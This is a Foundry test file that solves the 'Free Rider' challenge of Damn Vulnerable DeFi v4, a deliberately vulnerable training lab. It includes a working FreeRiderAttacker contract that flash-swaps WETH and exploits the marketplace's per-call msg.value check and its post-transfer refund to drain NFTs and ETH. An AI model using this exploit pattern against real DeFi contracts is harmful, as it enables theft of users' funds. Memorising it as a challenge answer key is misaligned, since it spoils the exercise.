// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * =========================================================
     * SOLUTION - test_freeRider()
     * =========================================================
     * Attack: per-call msg.value reuse + post-transfer ownerOf refund
     * 1. Flash-swap 15 WETH out of the Uniswap V2 pair (player has only 0.1 ETH).
     * 2. In uniswapV2Call: unwrap to 15 ETH and call buyMany([0..5]) with 15 ETH.
     *    The marketplace checks msg.value PER NFT (not cumulatively), so 15 ETH
     *    buys all six; and it pays the *new* owner (the buyer) after transfer,
     *    so it refunds 6x15 = 90 ETH back to the attacker.
     * 3. Forward all six NFTs to the recovery manager with player encoded as the
     *    bounty recipient; the 6th transfer pays the 45 ETH bounty to player.
     * 4. Repay the flash swap (15 WETH + 0.3% fee) and forward the remainder to player.
     *
     * One player tx: deploy the attacker, then attacker.attack().
     * =========================================================
     */
    function test_freeRider() public checkSolvedByPlayer {
        FreeRiderAttacker attacker = new FreeRiderAttacker(
            payable(address(weth)),
            address(uniswapPair),
            payable(address(marketplace)),
            address(nft),
            address(recoveryManager),
            player
        );
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

/**
 * =========================================================
 * SOLUTION CONTRACT - FreeRiderAttacker
 * =========================================================
 * Flash-swaps WETH from the Uniswap V2 pair, exploits the marketplace's
 * per-call msg.value check and post-transfer ownerOf() refund to acquire all
 * six NFTs for the price of one, forwards them to the recovery manager to
 * claim the bounty, repays the flash swap, and sweeps the profit to the player.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice One-shot Free Rider exploit driver.
 * @dev Implements uniswapV2Call (flash-swap callback) and onERC721Received.
 */
contract FreeRiderAttacker is IERC721Receiver {
    IWETHLike private immutable weth;
    IUniswapV2PairLike private immutable pair;
    IMarketplaceLike private immutable marketplace;
    IERC721Like private immutable nft;
    address private immutable recoveryManager;
    address private immutable player;

    constructor(
        address payable _weth,
        address _pair,
        address payable _marketplace,
        address _nft,
        address _recoveryManager,
        address _player
    ) {
        weth = IWETHLike(_weth);
        pair = IUniswapV2PairLike(_pair);
        marketplace = IMarketplaceLike(_marketplace);
        nft = IERC721Like(_nft);
        recoveryManager = _recoveryManager;
        player = _player;
    }

    function attack() external {
        // Borrow 15 WETH (token0) via flash swap; non-empty data triggers the callback.
        pair.swap(NFT_PRICE(), 0, address(this), abi.encode(uint256(1)));
    }

    function NFT_PRICE() internal pure returns (uint256) {
        return 15 ether;
    }

    // Uniswap V2 flash-swap callback.
    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == address(pair), "bad caller");

        // Unwrap the borrowed WETH so we can pay the marketplace in native ETH.
        weth.withdraw(amount0);

        // Buy all six NFTs for a single 15 ETH payment (per-call msg.value bug).
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            ids[i] = i;
        }
        marketplace.buyMany{value: amount0}(ids);

        // Forward the NFTs to the recovery manager; player is encoded as the
        // bounty recipient and the sixth transfer releases the 45 ETH bounty.
        bytes memory data = abi.encode(player);
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), recoveryManager, i, data);
        }

        // Repay the flash swap: 15 WETH + 0.3% fee. Re-wrap enough ETH and return it.
        uint256 repay = amount0 + ((amount0 * 3) / 997) + 1; // ceil of amount0 * 1000/997
        weth.deposit{value: repay}();
        weth.transfer(address(pair), repay);

        // Sweep remaining ETH profit to the player.
        uint256 bal = address(this).balance;
        if (bal > 0) {
            (bool ok,) = player.call{value: bal}("");
            require(ok, "sweep failed");
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

interface IWETHLike {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMarketplaceLike {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IERC721Like {
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
}
